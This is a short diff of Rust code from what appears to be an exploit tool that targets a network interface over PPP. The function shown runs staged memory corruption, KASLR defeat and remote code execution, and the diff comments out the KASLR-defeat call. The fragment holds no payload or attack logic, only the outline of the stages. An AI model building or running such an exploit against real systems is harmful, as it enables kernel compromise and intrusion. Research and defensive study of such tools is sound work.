@@ -35,7 +35,7 @@ fn run_exploit(interface_name: String) {
     println!("[+] STAGE 1: Memory corruption");
     expl.memory_corruption(&interface);
     println!("[+] STAGE 2: KASLR defeat");
-    expl.defeat_kaslr(&interface);
+    // expl.defeat_kaslr(&interface);
     println!("[+] STAGE 3: Remote code execution");
     // expl.ppp_negotiation(&interface);
     // expl.lcp_negotiation(&interface);
